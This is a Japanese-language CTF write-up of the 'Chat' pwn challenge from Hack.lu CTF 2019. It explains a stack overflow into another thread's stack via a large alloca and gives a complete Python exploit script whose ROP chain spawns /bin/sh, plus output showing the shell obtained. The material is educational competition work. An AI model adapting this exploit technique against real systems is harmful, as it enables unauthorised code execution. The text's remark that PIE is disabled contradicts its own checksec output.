# [pwn 381pts] Chat - Hack.lu CTF 2019
64ビットでPIEやRELROは無効です。
```
$ checksec -f chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols     Yes      0               2       chall
```
なんかチャンネル（スレッド）を作ったりechoできたりといろんなコマンドが実装されています。競技中に気づいたのはallocaに負の値が渡せるという点ですが、その後fgetsで読むサイズも負数になってエラーでスレッドからさよならしちゃうので直接ROPなどはできませんでした。
公式writeupがあるのでそれを読みましょう。

スレッドが作成される際のスタックサイズはoptionで決まっているのでallocaで十分大きなサイズを指定すると別スレッドのスタックに突入します。したがって、リターンアドレスを書き換えられるのでROP chainを書き込んでjoinすればシェルが取れます。

```python
from ptrlib import *

def nc():
    sock.sendlineafter("> ", "/nc")
    sock.recvuntil("Channel ")
    return int(sock.recvline()[:-1])

def echo(size, data):
    sock.sendlineafter("> ", "/e")
    sock.sendline(str(size))
    sock.sendline(data)
    return

def pc():
    sock.sendlineafter("> ", "/pc")
    return

def qc():
    sock.sendlineafter("> ", "/qc")
    return

def jc(cid):
    sock.sendlineafter("> ", "/jc {}".format(cid))

elf = ELF("./chat")
sock = Socket("localhost", 9999)
#sock = Socket("chat.forfuture.fluxfingers.net", 1337)
rop_pop_eax = 0x08051cf6
rop_pop_ebx = 0x0804901e
rop_int80 = 0x0807d3d0

# channel 1
nc()
pc()
# channel 2
nc()
pc()

# ROP
envp = 0x8048000 + next(elf.find("\0"*4))
payload = b''
payload += flat([
    p32(0xdeadbeef),
    p32(elf.symbol("command") + 0x14),
    p32(elf.symbol("command") + 0x10),
    p32(rop_pop_ebx),
    p32(elf.symbol("command") + 0x8),
    p32(rop_pop_eax),
    p32(11),
    p32(rop_int80)
])
assert b'\n' not in payload
assert b'\r' not in payload

jc(1)
# 0x3d090 - 0xa30
echo(250000, payload)
qc()

payload  = b"/jc 2\0\0\0"
payload += b"/bin/sh\0"
payload += p32(elf.symbol("command") + 8)
payload += p32(0)
sock.sendlineafter("> ", payload)

sock.interactive()
```

ほー。
```
$ python solve.py 
[+] __init__: Successfully connected to localhost:9999
Joining Chat Channel.
[ptrlib]$ /bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
$
```

# 感想
allocaは負数を与えるものというイメージにとらわれていました。

# 参考文献
[1] [https://ctftime.org/writeup/17027](https://ctftime.org/writeup/17027)